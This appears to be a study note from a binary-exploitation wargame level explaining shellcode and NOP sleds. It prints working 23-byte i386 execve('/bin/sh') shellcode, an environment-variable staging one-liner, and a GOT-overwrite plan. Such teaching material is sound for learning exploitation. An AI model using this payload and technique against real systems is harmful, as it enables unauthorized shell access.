# Shellcode and NOP Sled

## What is shellcode?

Shellcode is a small piece of machine code (not C, not assembly text — raw bytes) that performs a specific action, typically spawning a shell via `execve("/bin/sh", NULL, NULL)`. It's called "shellcode" because its most common purpose is to open a shell.

## Example: i386 execve("/bin/sh") shellcode

```
\x31\xc0              xor    %eax,%eax        ; eax = 0
\x50                  push   %eax             ; push NULL terminator
\x68\x2f\x2f\x73\x68 push   $0x68732f2f      ; push "//sh"
\x68\x2f\x62\x69\x6e push   $0x6e69622f      ; push "/bin"
\x89\xe3              mov    %esp,%ebx        ; ebx = pointer to "/bin//sh"
\x50                  push   %eax             ; push NULL (argv[1])
\x53                  push   %ebx             ; push pointer to "/bin//sh"
\x89\xe1              mov    %esp,%ecx        ; ecx = argv array
\xb0\x0b              mov    $0xb,%al         ; syscall number 11 = execve
\xcd\x80              int    $0x80            ; trigger syscall
```

Total: 23 bytes. This is architecture-specific (i386 only).

## What is a NOP sled?

A NOP sled is a sequence of NOP instructions (`\x90` on x86) placed before the shellcode. NOPs do nothing — they just advance the instruction pointer. This creates a "landing zone": the exploit doesn't need to hit the exact start of the shellcode, just anywhere in the sled.

```
[NOP NOP NOP NOP ... NOP NOP] [SHELLCODE]
 ←── landing zone ──────────→  ←── payload ──→
```

If execution lands anywhere in the NOP region, it slides forward into the shellcode.

## Storing shellcode in environment variables

When the stack is executable but the buffer is too small for shellcode, a common technique is to store the shellcode in an environment variable:

```bash
export SHELLCODE=$(python -c 'print "\x90"*100 + "\x31\xc0..."')
```

Environment variables are stored on the stack at program startup. A helper program using `getenv("SHELLCODE")` reveals the address. The exploit then redirects execution to that address.

## Requirements

- **Stack must be executable** (NX disabled) — otherwise the CPU refuses to execute code from the stack
- The shellcode must not contain bytes that would be filtered (e.g., `\x00` for string functions, `\x0a` for `fgets`)

## In this project (Level05)

- NX is disabled → stack is executable
- Shellcode (23 bytes) stored in `SHELLCODE` environment variable with 100-byte NOP sled
- Address found via `getenv()` helper: `0xffffd884`
- GOT overwrite redirects `exit()` to this address

## References

- Shellcode used in this level (23 bytes, Hamza Megahed): https://shell-storm.org/shellcode/files/shellcode-827.html
- Shellcode (Wikipedia): https://en.wikipedia.org/wiki/Shellcode
- Shell-storm shellcode database: https://shell-storm.org/shellcode/
- NOP sled (Wikipedia): https://en.wikipedia.org/wiki/NOP_slide
